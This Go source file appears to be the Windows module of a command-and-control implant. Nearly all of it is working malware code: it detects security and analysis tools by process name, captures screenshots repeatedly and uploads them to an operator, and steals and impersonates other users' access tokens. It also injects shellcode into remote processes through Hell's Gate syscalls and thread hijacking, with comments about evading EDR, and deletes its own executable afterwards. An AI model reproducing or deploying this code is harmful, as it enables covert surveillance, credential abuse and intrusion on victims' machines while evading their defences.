//go:build windows

package agent

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procEnumProcesses            = windows.NewLazySystemDLL("psapi.dll").NewProc("EnumProcesses")
	procGetProcessImageFileNameW = windows.NewLazySystemDLL("psapi.dll").NewProc("GetProcessImageFileNameW")
	procOpenProcessToken2        = windows.NewLazySystemDLL("advapi32.dll").NewProc("OpenProcessToken")
	procGetTokenInformation      = windows.NewLazySystemDLL("advapi32.dll").NewProc("GetTokenInformation")
	procLookupAccountSidW        = windows.NewLazySystemDLL("advapi32.dll").NewProc("LookupAccountSidW")
	procDuplicateTokenEx         = windows.NewLazySystemDLL("advapi32.dll").NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser  = windows.NewLazySystemDLL("advapi32.dll").NewProc("ImpersonateLoggedOnUser")
	procLogonUserW               = windows.NewLazySystemDLL("advapi32.dll").NewProc("LogonUserW")
	procRevertToSelf2            = windows.NewLazySystemDLL("advapi32.dll").NewProc("RevertToSelf")
	procGetDesktopWindow         = windows.NewLazySystemDLL("user32.dll").NewProc("GetDesktopWindow")
	procGetDC                    = windows.NewLazySystemDLL("user32.dll").NewProc("GetDC")
	procReleaseDC                = windows.NewLazySystemDLL("user32.dll").NewProc("ReleaseDC")
	procGetSystemMetrics         = windows.NewLazySystemDLL("user32.dll").NewProc("GetSystemMetrics")
	procOpenWindowStation        = windows.NewLazySystemDLL("user32.dll").NewProc("OpenWindowStationW")
	procSetProcessWindowStation  = windows.NewLazySystemDLL("user32.dll").NewProc("SetProcessWindowStation")
	procGetProcessWindowStation  = windows.NewLazySystemDLL("user32.dll").NewProc("GetProcessWindowStation")
	procCloseWindowStation       = windows.NewLazySystemDLL("user32.dll").NewProc("CloseWindowStation")
	procOpenDesktop              = windows.NewLazySystemDLL("user32.dll").NewProc("OpenDesktopW")
	procSetThreadDesktop         = windows.NewLazySystemDLL("user32.dll").NewProc("SetThreadDesktop")
	procGetThreadDesktop         = windows.NewLazySystemDLL("user32.dll").NewProc("GetThreadDesktop")
	procCloseDesktop             = windows.NewLazySystemDLL("user32.dll").NewProc("CloseDesktop")
	procGetCurrentThreadId       = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetCurrentThreadId")
	procCreateCompatibleDC       = windows.NewLazySystemDLL("gdi32.dll").NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap   = windows.NewLazySystemDLL("gdi32.dll").NewProc("CreateCompatibleBitmap")
	procSelectObject             = windows.NewLazySystemDLL("gdi32.dll").NewProc("SelectObject")
	procBitBlt                   = windows.NewLazySystemDLL("gdi32.dll").NewProc("BitBlt")
	procDeleteObject             = windows.NewLazySystemDLL("gdi32.dll").NewProc("DeleteObject")
	procDeleteDC                 = windows.NewLazySystemDLL("gdi32.dll").NewProc("DeleteDC")
	procGetDIBits                = windows.NewLazySystemDLL("gdi32.dll").NewProc("GetDIBits")
)

// ── Process list ─────────────────────────────────────────────────────────────

// securityTools maps lowercase process name → "Vendor — Product" label.
var securityTools = map[string]string{
	// Windows Defender / Microsoft Defender for Endpoint
	"msmpeng.exe":              "Microsoft — Defender AV",
	"nissrv.exe":               "Microsoft — Defender Network Inspection",
	"mssense.exe":              "Microsoft — Defender for Endpoint (EDR)",
	"sensendr.exe":             "Microsoft — Defender for Endpoint",
	"securityhealthservice.exe":"Microsoft — Security Health Service",
	"mpdefendercoreservice.exe":"Microsoft — Defender Core",
	"mpcmdrun.exe":             "Microsoft — Defender CLI",
	// Sysmon
	"sysmon.exe":               "Microsoft — Sysmon",
	"sysmon64.exe":             "Microsoft — Sysmon (x64)",
	// CrowdStrike Falcon
	"csfalconservice.exe":      "CrowdStrike — Falcon Sensor",
	"csfalconcontainer.exe":    "CrowdStrike — Falcon Container",
	"falcon-sensor.exe":        "CrowdStrike — Falcon Sensor",
	"csagent.exe":              "CrowdStrike — Falcon Agent",
	// SentinelOne
	"sentinelagent.exe":        "SentinelOne — Agent",
	"sentinelservicehost.exe":  "SentinelOne — Service Host",
	"sentinelhelperservice.exe":"SentinelOne — Helper",
	"sentinelstaticengine.exe": "SentinelOne — Static Engine",
	"sentinel.exe":             "SentinelOne — Agent",
	// Carbon Black
	"cbdefense.exe":            "VMware Carbon Black — Defense",
	"cbssvc.exe":               "VMware Carbon Black — Cloud",
	"repmgr.exe":               "VMware Carbon Black — Response",
	"reputils.exe":             "VMware Carbon Black — Utils",
	"cbremd.exe":               "VMware Carbon Black — EDR",
	"carbonblack.exe":          "VMware Carbon Black",
	// Sophos
	"savservice.exe":           "Sophos — AV Service",
	"sophosui.exe":             "Sophos — UI",
	"almon.exe":                "Sophos — AutoUpdate Monitor",
	"sophoscleanm.exe":         "Sophos — Clean",
	"hmpalert.exe":             "Sophos — HitmanPro.Alert",
	"sophosntpservice.exe":     "Sophos — NTP Service",
	"sophosfileintegrity.exe":  "Sophos — File Integrity",
	// Symantec / Broadcom
	"ccsvchost.exe":            "Symantec — Endpoint Protection",
	"smc.exe":                  "Symantec — Management Client",
	"rtvscan.exe":              "Symantec — AV Scanner",
	"nortonsecurity.exe":       "Norton — Security",
	"nsbu.exe":                 "Norton — Security",
	"sepwsc.exe":               "Symantec — WSC",
	// McAfee / Trellix
	"mcshield.exe":             "McAfee/Trellix — On-Access Scanner",
	"mfemms.exe":               "McAfee/Trellix — Management Service",
	"mfeann.exe":               "McAfee/Trellix — Agent",
	"mcafeeframework.exe":      "McAfee — Framework",
	"masvc.exe":                "McAfee/Trellix — Agent Service",
	"macmnsvc.exe":             "McAfee/Trellix — Common Manager",
	// Trellix / FireEye HX
	"xagt.exe":                 "Trellix/FireEye — Endpoint Agent",
	"hxtray.exe":               "FireEye — HX Tray",
	// Trend Micro
	"tmbmsrv.exe":              "Trend Micro — Behavior Monitor",
	"ds_agent.exe":             "Trend Micro — Deep Security Agent",
	"tmlisten.exe":             "Trend Micro — Listener",
	"tmccapp.exe":              "Trend Micro — Apex One",
	"ntrtscan.exe":             "Trend Micro — Real-time Scan",
	// Kaspersky
	"avp.exe":                  "Kaspersky — AV Process",
	"avpui.exe":                "Kaspersky — UI",
	"kavfs.exe":                "Kaspersky — File Scanner",
	"ksde.exe":                 "Kaspersky — Disk Encryption",
	"klnagent.exe":             "Kaspersky — Network Agent",
	// ESET
	"ekrn.exe":                 "ESET — Kernel Service",
	"egui.exe":                 "ESET — GUI",
	"eguiproxy.exe":            "ESET — GUI Proxy",
	"eamonm.exe":               "ESET — Access Monitor",
	// Bitdefender
	"bdagent.exe":              "Bitdefender — Agent",
	"vsserv.exe":               "Bitdefender — VS Service",
	"bdservicehost.exe":        "Bitdefender — Service Host",
	"epiclauncher.exe":         "Bitdefender — GravityZone",
	"bdredline.exe":            "Bitdefender — Redline",
	// Cylance / BlackBerry
	"cylancesvc.exe":           "Cylance — Service",
	"cylanceui.exe":            "Cylance — UI",
	"cyserver.exe":             "Cylance/Palo Alto — Cortex",
	// Palo Alto Cortex XDR
	"traps_agent.exe":          "Palo Alto — Cortex XDR",
	"cywarden.exe":             "Palo Alto — Cortex XDR Warden",
	"cyverak.exe":              "Palo Alto — Cortex XDR",
	"cortex.exe":               "Palo Alto — Cortex XDR",
	// Elastic
	"elastic-agent.exe":        "Elastic — Agent",
	"elastic-endpoint.exe":     "Elastic — Endpoint",
	"winlogbeat.exe":           "Elastic — Winlogbeat",
	// Malwarebytes
	"mbam.exe":                 "Malwarebytes — Scanner",
	"malwarebytes.exe":         "Malwarebytes — UI",
	"mbamservice.exe":          "Malwarebytes — Service",
	// Webroot
	"wrsa.exe":                 "Webroot — SecureAnywhere",
	"wrskyclient.exe":          "Webroot — Sky Client",
	// Tanium
	"taniumclient.exe":         "Tanium — Client",
	"taniumendpointindex.exe":  "Tanium — Endpoint Index",
	// Qualys
	"qualysagent.exe":          "Qualys — Cloud Agent",
	"qagent.exe":               "Qualys — Agent",
	// Rapid7 / InsightIDR
	"ir_agent.exe":             "Rapid7 — Insight Agent",
	// LogRhythm
	"scsm.exe":                 "LogRhythm — System Monitor",
	// Darktrace
	"darktrace.exe":            "Darktrace — Agent",
	// Cybereason
	"cybereason.exe":           "Cybereason — ActiveProbe",
	"minionhost.exe":           "Cybereason — Minion",
	// Cisco Secure (AMP)
	"sfc.exe":                  "Cisco — Secure Endpoint (AMP)",
	"ampdaemon.exe":            "Cisco — AMP Daemon",
	// Splunk
	"splunkd.exe":              "Splunk — Forwarder",
	// Cortex XSOAR / Demisto
	"demistoagent.exe":         "Palo Alto — XSOAR Agent",
	// Analysis / sandbox indicators
	"procmon.exe":              "SysInternals — Process Monitor [ANALYSIS]",
	"procmon64.exe":            "SysInternals — Process Monitor [ANALYSIS]",
	"procexp.exe":              "SysInternals — Process Explorer [ANALYSIS]",
	"procexp64.exe":            "SysInternals — Process Explorer [ANALYSIS]",
	"wireshark.exe":            "Wireshark — Packet Capture [ANALYSIS]",
	"fiddler.exe":              "Telerik — Fiddler [ANALYSIS]",
	"x64dbg.exe":               "x64dbg — Debugger [ANALYSIS]",
	"ollydbg.exe":              "OllyDbg — Debugger [ANALYSIS]",
	"idaq.exe":                 "IDA Pro — Disassembler [ANALYSIS]",
	"idaq64.exe":               "IDA Pro — Disassembler [ANALYSIS]",
}

func listProcesses() (string, error) {
	pids := make([]uint32, 1024)
	var needed uint32
	r, _, err := procEnumProcesses.Call(
		uintptr(unsafe.Pointer(&pids[0])),
		uintptr(len(pids)*4),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r == 0 {
		return "", fmt.Errorf("EnumProcesses: %w", err)
	}
	count := int(needed / 4)

	type secHit struct {
		pid   uint32
		name  string
		label string
	}
	var hits []secHit

	var sb strings.Builder
	fmt.Fprintf(&sb, "%-8s  %-40s  %s\n", "PID", "IMAGE", "SECURITY")
	fmt.Fprintf(&sb, "%-8s  %-40s  %s\n", "---", "-----", "--------")

	for i := 0; i < count; i++ {
		pid := pids[i]
		h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if err != nil {
			fmt.Fprintf(&sb, "%-8d  %-40s\n", pid, "<access denied>")
			continue
		}
		nameBuf := make([]uint16, 260)
		procGetProcessImageFileNameW.Call(
			uintptr(h), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)))
		windows.CloseHandle(h)

		name := windows.UTF16ToString(nameBuf)
		if idx := strings.LastIndexAny(name, `/\`); idx >= 0 {
			name = name[idx+1:]
		}
		if name == "" {
			name = "<unknown>"
		}

		label := ""
		if vendor, ok := securityTools[strings.ToLower(name)]; ok {
			label = "[" + vendor + "]"
			hits = append(hits, secHit{pid, name, vendor})
		}
		fmt.Fprintf(&sb, "%-8d  %-40s  %s\n", pid, name, label)
	}

	if len(hits) > 0 {
		sb.WriteString("\n── Security Tools Detected ─────────────────────────────\n")
		for _, h := range hits {
			fmt.Fprintf(&sb, "  %-45s  pid %-6d  %s\n", h.label, h.pid, h.name)
		}
	} else {
		sb.WriteString("\n── No known security tools detected ────────────────────\n")
	}
	return sb.String(), nil
}

func listProcessesJSON() (string, error) {
	pids := make([]uint32, 1024)
	var needed uint32
	r, _, err := procEnumProcesses.Call(
		uintptr(unsafe.Pointer(&pids[0])),
		uintptr(len(pids)*4),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r == 0 {
		return "", fmt.Errorf("EnumProcesses: %w", err)
	}
	count := int(needed / 4)

	type procEntry struct {
		PID      uint32 `json:"pid"`
		Name     string `json:"name"`
		Security string `json:"security,omitempty"`
	}
	procs := make([]procEntry, 0, count)
	for i := 0; i < count; i++ {
		pid := pids[i]
		h, openErr := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if openErr != nil {
			procs = append(procs, procEntry{PID: pid, Name: "<access denied>"})
			continue
		}
		nameBuf := make([]uint16, 260)
		procGetProcessImageFileNameW.Call(
			uintptr(h), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)))
		windows.CloseHandle(h)

		name := windows.UTF16ToString(nameBuf)
		if idx := strings.LastIndexAny(name, `/\`); idx >= 0 {
			name = name[idx+1:]
		}
		if name == "" {
			name = "<unknown>"
		}
		sec := ""
		if vendor, ok := securityTools[strings.ToLower(name)]; ok {
			sec = vendor
		}
		procs = append(procs, procEntry{PID: pid, Name: name, Security: sec})
	}

	b, marshalErr := json.Marshal(procs)
	if marshalErr != nil {
		return "", marshalErr
	}
	return string(b), nil
}

// ── Screenshot ────────────────────────────────────────────────────────────────

const (
	SM_CXSCREEN = 0
	SM_CYSCREEN = 1
	SRCCOPY     = 0x00CC0020
	BI_RGB      = 0
)

type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// captureScreen returns a PNG-encoded screenshot as bytes.
func captureScreen() ([]byte, error) {
	const WINSTA_ALL_ACCESS = 0x037F
	const DESKTOP_ALL_ACCESS = 0x01FF

	hOrigWinSta, _, _ := procGetProcessWindowStation.Call()
	hWinSta, _, _ := procOpenWindowStation.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("WinSta0"))),
		0, WINSTA_ALL_ACCESS,
	)
	if hWinSta != 0 {
		procSetProcessWindowStation.Call(hWinSta)
	}

	tid, _, _ := procGetCurrentThreadId.Call()
	hOrigDesk, _, _ := procGetThreadDesktop.Call(tid)
	hDesk, _, _ := procOpenDesktop.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Default"))),
		0, 0, DESKTOP_ALL_ACCESS,
	)
	if hDesk != 0 {
		procSetThreadDesktop.Call(hDesk)
	}

	defer func() {
		if hDesk != 0 {
			procSetThreadDesktop.Call(hOrigDesk)
			procCloseDesktop.Call(hDesk)
		}
		if hWinSta != 0 {
			procSetProcessWindowStation.Call(hOrigWinSta)
			procCloseWindowStation.Call(hWinSta)
		}
	}()

	w, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	h, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
	width, height := int32(w), int32(h)
	if width <= 0 || height <= 0 {
		return nil, fmt.Errorf("invalid screen dimensions: %dx%d", width, height)
	}

	hdc, _, _ := procGetDC.Call(0)
	defer procReleaseDC.Call(0, hdc)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdc)
	defer procDeleteDC.Call(hdcMem)

	hbmp, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(width), uintptr(height))
	defer procDeleteObject.Call(hbmp)

	procSelectObject.Call(hdcMem, hbmp)
	procBitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height), hdc, 0, 0, SRCCOPY)

	bih := BITMAPINFOHEADER{
		BiSize:        40,
		BiWidth:       width,
		BiHeight:      -height,
		BiPlanes:      1,
		BiBitCount:    32,
		BiCompression: BI_RGB,
	}
	pixSize := int(width) * int(height) * 4
	pixels := make([]byte, pixSize)
	procGetDIBits.Call(
		hdcMem, hbmp, 0, uintptr(height),
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bih)),
		0,
	)

	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			i := (y*int(width) + x) * 4
			img.SetRGBA(x, y, color.RGBA{R: pixels[i+2], G: pixels[i+1], B: pixels[i], A: 255})
		}
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("png encode: %w", err)
	}
	return buf.Bytes(), nil
}

func takeScreenshot(t transport, taskID int64) (string, error) {
	data, err := captureScreen()
	if err != nil {
		return "", err
	}
	filename := "screenshot.png"
	if err := t.uploadFile(taskID, filename, data); err != nil {
		return "screenshot (base64 PNG):\n" + base64.StdEncoding.EncodeToString(data), nil
	}
	return fmt.Sprintf("screenshot saved: %s (%d bytes)", filename, len(data)), nil
}

// ── Token operations ──────────────────────────────────────────────────────────

var stolenToken windows.Token

// ── Token Store ───────────────────────────────────────────────────────────────

type tsEntry struct {
	ID   int
	PID  uint32
	User string
	tok  windows.Token
}

var tsStore struct {
	sync.Mutex
	entries []tsEntry
	nextID  int
}

func tsAdd(pid uint32, tok windows.Token) (int, string) {
	user := ""
	if info, err := tok.GetTokenUser(); err == nil {
		if acct, dom, _, err := info.User.Sid.LookupAccount(""); err == nil {
			user = dom + "\\" + acct
		}
	}
	tsStore.Lock()
	defer tsStore.Unlock()
	tsStore.nextID++
	tsStore.entries = append(tsStore.entries, tsEntry{ID: tsStore.nextID, PID: pid, User: user, tok: tok})
	return tsStore.nextID, user
}

func tsShow() string {
	tsStore.Lock()
	defer tsStore.Unlock()
	if len(tsStore.entries) == 0 {
		return "(token store empty)"
	}
	var sb strings.Builder
	for _, e := range tsStore.entries {
		fmt.Fprintf(&sb, "[%d] PID=%d user=%s\n", e.ID, e.PID, e.User)
	}
	return sb.String()
}

func tsUse(id int) string {
	tsStore.Lock()
	defer tsStore.Unlock()
	for _, e := range tsStore.entries {
		if e.ID == id {
			stolenToken = e.tok
			return fmt.Sprintf("[+] using token #%d (%s)", id, e.User)
		}
	}
	return fmt.Sprintf("[-] token #%d not found", id)
}

func tsRemove(id int) string {
	tsStore.Lock()
	defer tsStore.Unlock()
	for i, e := range tsStore.entries {
		if e.ID == id {
			e.tok.Close()
			tsStore.entries = append(tsStore.entries[:i], tsStore.entries[i+1:]...)
			return fmt.Sprintf("[+] token #%d removed", id)
		}
	}
	return fmt.Sprintf("[-] token #%d not found", id)
}

func tsClear() string {
	tsStore.Lock()
	defer tsStore.Unlock()
	for _, e := range tsStore.entries {
		e.tok.Close()
	}
	tsStore.entries = nil
	return "[+] token store cleared"
}

// stealTokenFromPID opens a process, duplicates its token, and returns it.
func stealTokenFromPID(pid uint32) (windows.Token, error) {
	h, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false, pid)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	var tok windows.Token
	r, _, e := procOpenProcessToken2.Call(
		uintptr(h),
		uintptr(windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE),
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return 0, fmt.Errorf("OpenProcessToken: %w", e)
	}
	defer windows.CloseHandle(windows.Handle(tok))

	var dup windows.Token
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(tok),
		uintptr(windows.TOKEN_ALL_ACCESS),
		0,
		2, // SecurityImpersonation
		1, // TokenImpersonation
		uintptr(unsafe.Pointer(&dup)),
	)
	if r == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx: %w", e)
	}
	return dup, nil
}

func stealToken(pid int) (string, error) {
	h, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false, uint32(pid))
	if err != nil {
		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	var tok windows.Token
	r, _, e := procOpenProcessToken2.Call(
		uintptr(h),
		uintptr(windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE),
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return "", fmt.Errorf("OpenProcessToken: %w", e)
	}
	defer windows.CloseHandle(windows.Handle(tok))

	var dup windows.Token
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(tok),
		uintptr(windows.TOKEN_ALL_ACCESS),
		0,
		2, // SecurityImpersonation
		1, // TokenImpersonation
		uintptr(unsafe.Pointer(&dup)),
	)
	if r == 0 {
		return "", fmt.Errorf("DuplicateTokenEx: %w", e)
	}

	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(dup))
	if r == 0 {
		windows.CloseHandle(windows.Handle(dup))
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
	}
	stolenToken = dup
	return fmt.Sprintf("token stolen from PID %d, impersonating", pid), nil
}

func makeToken(userDomain, password string) (string, error) {
	domain := "."
	user := userDomain
	if idx := strings.IndexAny(userDomain, `\@`); idx >= 0 {
		if userDomain[idx] == '\\' {
			domain = userDomain[:idx]
			user = userDomain[idx+1:]
		} else {
			user = userDomain[:idx]
			domain = userDomain[idx+1:]
		}
	}
	userW, _ := windows.UTF16PtrFromString(user)
	domainW, _ := windows.UTF16PtrFromString(domain)
	passW, _ := windows.UTF16PtrFromString(password)

	var tok windows.Token
	r, _, e := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)),
		2, // LOGON32_LOGON_INTERACTIVE
		0, // LOGON32_PROVIDER_DEFAULT
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return "", fmt.Errorf("LogonUser: %w", e)
	}
	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(tok))
	if r == 0 {
		windows.CloseHandle(windows.Handle(tok))
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
	}
	if stolenToken != 0 {
		windows.CloseHandle(windows.Handle(stolenToken))
	}
	stolenToken = tok
	return fmt.Sprintf("token created for %s\\%s", domain, user), nil
}

func dropToken() (string, error) {
	if stolenToken != 0 {
		windows.CloseHandle(windows.Handle(stolenToken))
		stolenToken = 0
	}
	r, _, e := procRevertToSelf2.Call()
	if r == 0 {
		return "", fmt.Errorf("RevertToSelf: %w", e)
	}
	return "reverted to original token", nil
}

func tokenWhoami() string {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
		return "error: " + err.Error()
	}
	defer tok.Close()
	u, err := tok.GetTokenUser()
	if err != nil {
		return "error getting token user: " + err.Error()
	}
	var nameLen, domainLen uint32
	var sidType uint32
	// Get sizes
	procLookupAccountSidW.Call(0, uintptr(unsafe.Pointer(u.User.Sid)),
		0, uintptr(unsafe.Pointer(&nameLen)),
		0, uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&sidType)))
	nameW := make([]uint16, nameLen)
	domainW := make([]uint16, domainLen)
	procLookupAccountSidW.Call(0, uintptr(unsafe.Pointer(u.User.Sid)),
		uintptr(unsafe.Pointer(&nameW[0])), uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domainW[0])), uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&sidType)))
	return windows.UTF16ToString(domainW) + `\` + windows.UTF16ToString(nameW)
}

// ── Remote injection ──────────────────────────────────────────────────────────

func injectRemote(pid int, sc []byte) error {
	h, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|windows.PROCESS_CREATE_THREAD,
		false, uint32(pid))
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	// NtAllocateVirtualMemory via Hell's Gate (clean SSN + spoofed call-stack).
	var base uintptr
	size := uintptr(len(sc))
	if err := hgAllocateVirtualMemory(h, &base, &size,
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE); err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	// WriteProcessMemory — hooks here are far less common than VirtualAllocEx.
	var written uintptr
	if err := windows.WriteProcessMemory(h, base, &sc[0], uintptr(len(sc)), &written); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// NtProtectVirtualMemory via Hell's Gate → RX.
	var oldProt uint32
	sz := uintptr(len(sc))
	if err := ntProtectEx(h, base, sz, windows.PAGE_EXECUTE_READ, &oldProt); err != nil {
		return fmt.Errorf("NtProtectVirtualMemory: %w", err)
	}

	// NtCreateThreadEx via Hell's Gate.
	hThread, err := hgCreateThreadEx(h, base, 0)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	windows.CloseHandle(hThread)
	return nil
}

// ── Thread-hijack injection into an existing running process ─────────────────
//
// Evasion advantages over classic VirtualAllocEx+CreateRemoteThread:
//   • Section mapping: no WriteProcessMemory, no VirtualAllocEx
//   • Thread hijacking: no CreateRemoteThread, no NtCreateThreadEx
//   • Thread-creation events are NOT generated → lower EDR signal

func injectRemoteHijack(pid int, sc []byte) (string, error) {
	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Map shellcode into target — NtCreateSection + NtMapViewOfSection (no WPM)
	remoteAddr, err := injectViaSection(hProc, sc)
	if err != nil {
		return "", fmt.Errorf("section-map: %w", err)
	}

	// Enumerate threads to find one belonging to target PID
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return "", fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	var targetTID uint32
	for err = windows.Thread32First(snap, &te); err == nil; err = windows.Thread32Next(snap, &te) {
		if te.OwnerProcessID == uint32(pid) {
			targetTID = te.ThreadID
			break
		}
	}
	if targetTID == 0 {
		return "", fmt.Errorf("no thread found in PID %d", pid)
	}

	hThread, err := windows.OpenThread(
		windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
		false, targetTID)
	if err != nil {
		return "", fmt.Errorf("OpenThread(%d): %w", targetTID, err)
	}
	defer windows.CloseHandle(hThread)

	var procSuspendThread = kernel32.NewProc("SuspendThread")
	r, _, e := procSuspendThread.Call(uintptr(hThread))
	if r == ^uintptr(0) {
		return "", fmt.Errorf("SuspendThread: %w", e)
	}

	if err := hijackThread(hThread, remoteAddr); err != nil {
		windows.ResumeThread(hThread)
		return "", fmt.Errorf("hijackThread: %w", err)
	}

	if _, err := windows.ResumeThread(hThread); err != nil {
		return "", fmt.Errorf("ResumeThread: %w", err)
	}

	return fmt.Sprintf("[+] thread-hijack: %d bytes mapped → PID %d TID %d @ 0x%x",
		len(sc), pid, targetTID, remoteAddr), nil
}

// ── Screenwatch ───────────────────────────────────────────────────────────────

var screenWatchCancel context.CancelFunc
var screenWatchMu sync.Mutex

func startScreenWatch(t transport, taskID int64, intervalSec int) {
	screenWatchMu.Lock()
	if screenWatchCancel != nil {
		screenWatchCancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	screenWatchCancel = cancel
	screenWatchMu.Unlock()

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case <-time.After(time.Duration(intervalSec) * time.Second):
				data, err := captureScreen()
				if err != nil {
					continue
				}
				fname := fmt.Sprintf("screen_%d.png", time.Now().Unix())
				t.uploadFile(taskID, fname, data) //nolint:errcheck
			}
		}
	}()
}

func stopScreenWatch() string {
	screenWatchMu.Lock()
	defer screenWatchMu.Unlock()
	if screenWatchCancel == nil {
		return "[-] screenwatch not running"
	}
	screenWatchCancel()
	screenWatchCancel = nil
	return "[+] screenwatch stopped"
}

// ── Self cleanup ──────────────────────────────────────────────────────────────

func selfCleanup() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	// Schedule deletion via cmd.exe after a short delay, then exit
	cmd := fmt.Sprintf(`/C ping -n 3 127.0.0.1 >nul & del /F /Q "%s"`, exe)
	c := exec.Command("cmd.exe", cmd)
	c.Start()
	os.Exit(0)
}
